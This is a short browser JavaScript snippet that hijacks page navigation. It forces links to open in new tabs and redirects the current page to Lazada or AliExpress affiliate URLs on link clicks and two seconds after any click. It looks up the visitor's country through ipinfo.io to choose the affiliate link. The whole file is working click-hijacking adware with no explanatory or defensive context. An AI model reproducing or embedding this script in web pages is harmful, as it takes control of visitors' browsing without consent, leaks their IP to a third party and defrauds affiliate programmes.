(()=>{

  const urlDirectClick = "https://c.lazada.co.id/t/c.bdcwXx?sub_aff_id=Free_Shipping";
  const urlDirectClick2 = "https://s.click.aliexpress.com/e/_DFG72Lt";
  
  // Fungsi untuk mendeteksi IP Indonesia
  const isIndonesia = () => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://ipinfo.io/json", true);
      xhr.onreadystatechange = () => {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            const response = JSON.parse(xhr.responseText);
            const country = response.country;
            resolve(country === "ID");
          } else {
            reject(false);
          }
        }
      };
      xhr.send();
    });
  };

  document.querySelectorAll("a").forEach(element=>{
    element.setAttribute("target","_blank");
    element.addEventListener("click", async event=>{
      const isTargetBlank=event.target.target==="_blank";
      const isShortcutKeyPressed=event.ctrlKey||event.shiftKey||event.metaKey;
      if(isTargetBlank||isShortcutKeyPressed){
        try {
          const isIndonesiaUser = await isIndonesia();
          if (isIndonesiaUser) {
            window.location.replace(urlDirectClick);
          } else {
            window.location.replace(urlDirectClick2);
          }
        } catch (e) {
          window.location.replace(urlDirectClick2);
        }
      };
    });
  });

  document.querySelector("body").addEventListener("click",async event=>{
    setTimeout(async ()=>{
      try {
        const isIndonesiaUser = await isIndonesia();
        if (isIndonesiaUser) {
          window.location.replace(urlDirectClick);
        } else {
          window.location.replace(urlDirectClick2);
        }
      } catch (e) {
        window.location.replace(urlDirectClick2);
      }
    }, 2000);
  });

})();
